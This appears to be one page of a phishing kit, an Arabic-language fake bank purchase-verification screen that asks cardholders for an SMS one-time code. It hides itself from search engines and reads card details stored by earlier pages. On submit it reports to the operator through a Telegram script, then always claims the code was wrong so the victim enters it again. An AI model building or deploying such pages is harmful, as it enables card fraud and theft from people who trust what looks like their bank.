<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
  <meta name="bingbot" content="noindex, nofollow" />
  <meta name="yandex" content="none" />
  <title>verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");

    * {
      font-family: "Readex Pro", sans-serif;
      font-optical-sizing: auto;
      font-weight: 400;
      font-style: normal;
      font-variation-settings: "HEXP" 0;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background:
        radial-gradient(circle at top right, rgba(31, 122, 103, 0.10), transparent 24%),
        radial-gradient(circle at top left, rgba(250, 166, 46, 0.10), transparent 22%),
        linear-gradient(180deg, #f7f8fb 0%, #eef2f6 100%);
      color: #243041;
    }

    .page-shell {
      width: min(100%, 720px);
      margin: 0 auto;
      min-height: 100vh;
      padding: 18px 14px 28px;
    }

    #applePayRadio {
      max-width: 100%;
    }

    #applePayRadio > .row > [class*="col-"] {
      flex: 0 1 420px;
      max-width: 420px;
      width: 100%;
    }

    @media (max-width: 767.98px) {
      .page-shell {
        padding: 0 10px 20px;
      }

      #applePayRadio {
        margin-top: 0 !important;
      }

      #applePayRadio > .row > [class*="col-"] {
        flex-basis: 100%;
        max-width: 100%;
      }

      .page-card {
        border-radius: 22px;
      }
    }

    .content-section {
      display: none;
    }

    .content-section.active {
      display: block;
    }

    #loadingOverlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.6);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }

    .page-card {
      background: #fff;
      border: 1px solid rgba(223, 228, 236, 0.95);
      border-radius: 28px;
      box-shadow: 0 20px 50px rgba(25, 31, 45, 0.08);
      overflow: hidden;
    }

    .page-card::before {
      content: "";
      display: block;
      height: 10px;
      background: linear-gradient(90deg, #146394 0%, #1f7a67 52%, #faa62e 100%);
    }

    .code-accent {
      height: 10px;
      background: linear-gradient(90deg, #146394 0%, #1f7a67 52%, #faa62e 100%);
    }

    .form-control {
      border-radius: 14px;
      border: 1px solid #d8dde6;
      min-height: 48px;
      box-shadow: none !important;
      background: #fdfdfd;
    }

    .form-control:focus {
      border-color: #faa62e;
      box-shadow: 0 0 0 0.18rem rgba(250, 166, 46, 0.18) !important;
    }

    .btn-primary {
      border: 0;
      border-radius: 16px;
      min-height: 48px;
      background: linear-gradient(180deg, #faa62e 0%, #e99016 100%);
      box-shadow: 0 14px 22px rgba(250, 166, 46, 0.22);
    }

    .btn-primary:hover {
      filter: brightness(0.98);
    }
  </style>
</head>
<body>
  <div class="page-shell">
  <div class="container mt-5" id="applePayRadio">
    <div class="row justify-content-center">
      <div class="col-md-6 col-lg-4">
        <div class="page-card">
          <div class="code-accent"></div>
          <div style="padding: 18px 16px 16px" class="text-center">
            <div class="d-flex justify-content-between mb-4">
              <img id="card_type" src="" style="height: 30px; width: 54px" />
              <img id="bank_type" src="" width="110px" />
            </div>
            <h5>تأكيد عملية الشراء</h5>
            <p class="text-right mt-3" style="font-size: small">
              تم إرسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP) إلى
              رقمك المسجل لدينا لتأكيد حركة الدفع في
              <span dir="ltr" id="today_time_and_date"></span>
            </p>
            <p class="text-right mt-3" style="font-size: small">
              يرجى عدم مشاركة الرمز مع أحد.
            </p>
            <form id="verificationForm">
              <div class="form-group text-right">
                <label for="verification_code_two">أدخل الرمز هنا:</label>
                <input
                  class="form-control text-center"
                  id="verification_code_two"
                  type="tel"
                  maxlength="6"
                  pattern="^(?:\d{4}|\d{6})$"
                  title="يجب أن يتكون رمز التحقق من 4 أرقام أو 6 أرقام بالضبط"
                  oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6)"
                  required
                />

                <div class="alert alert-danger text-right" id="decline-message" role="alert" style="display: none">
                  <span>الرمز المدخل غير صحيح.</span>
                </div>
              </div>
              <button class="btn btn-primary col-12" type="submit">
                تأكيد
              </button>
              <p class="mt-3" style="font-size: x-small">
                ستنتهي صلاحية هذه الصفحة تلقائياً بعد
                <span id="timer" style="color: red">2:49</span>
              </p>
              <p class="text-right text-secondary mt-3 small">
                هل تحتاج للمساعدة؟
              </p>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div id="loadingOverlay" class="d-none">
    <div class="text-center text-white">
      <div class="spinner-border text-light mb-3" role="status"></div>
      <h5 class="font-weight-bold">يرجى الانتظار</h5>
      <p>انتظر حتى تتم معالجة طلبك</p>
    </div>
  </div>

  <script src="assets/telegram/tg.js"></script>
  <script src="assets/telegram/telegram.js"></script>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("today_time_and_date").textContent =
        new Date().toLocaleString("ar-EG");

      const scheme = sessionStorage.getItem("Card type");
      const cardTypeEl = document.getElementById("card_type");
      if (scheme === "visa" || scheme === "mastercard") {
        cardTypeEl.src = "assets/photos/mastar.svg";
      } else {
        cardTypeEl.removeAttribute("src");
        cardTypeEl.style.display = "none";
      }
      cardTypeEl.style.float = "right";

      const bankTypeEl = document.getElementById("bank_type");
      bankTypeEl.removeAttribute("src");
      bankTypeEl.style.display = "none";

      const timerEl = document.getElementById("timer");
      let remainingSeconds = 2 * 60 + 49;

      function renderTimer() {
        const minutes = Math.floor(remainingSeconds / 60);
        const seconds = remainingSeconds % 60;
        timerEl.textContent = `${minutes}:${String(seconds).padStart(2, "0")}`;
      }

      renderTimer();
      setInterval(() => {
        if (remainingSeconds <= 0) {
          return;
        }
        remainingSeconds -= 1;
        renderTimer();
      }, 1000);
    });
  </script>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("verificationForm");
      const overlay = document.getElementById("loadingOverlay");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        overlay.classList.remove("d-none");
        overlay.classList.add("d-flex");

        let seconds = 3;
        if (window.TG) {
          window.TG.sendTelegramMessage("تم استلام طلب التحقق. لم يتم إرسال رمز التحقق إلى تيليجرام.");
        }

        const id = setInterval(() => {
          seconds--;
          if (seconds < 0) {
            clearInterval(id);
            overlay.classList.remove("d-flex");
            overlay.classList.add("d-none");
            document.getElementById("decline-message").style.display = "block";
          }
        }, 1000);
      });
    });
  </script>

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>

  </div>
</body>
</html>
